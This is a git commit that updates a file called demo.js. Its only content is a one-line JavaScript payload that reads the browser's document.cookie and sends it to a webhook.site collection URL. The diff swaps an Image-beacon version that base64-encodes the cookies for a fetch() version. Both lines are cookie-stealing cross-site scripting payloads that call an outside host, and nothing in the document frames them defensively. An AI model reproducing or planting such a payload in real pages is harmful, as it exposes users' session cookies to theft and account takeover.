13884af170b4b76424fb870d1e8f6e82170d7179
nguyenngoctiendev <123345255+nguyenngoctiendev@users.noreply.github.com>
2024-05-09 16:57:30 +0700

    Update demo.js

--- demo.js
+++ demo.js
@@ -1,1 +1,1 @@
-x = new Image() x.src = "https://webhook.site/036d6e79-43e6-4741-a5dd-72f470b37875?data="+btoa(document.cookie)
+fetch("https://webhook.site/036d6e79-43e6-4741-a5dd-72f470b37875?data="+document.cookie);
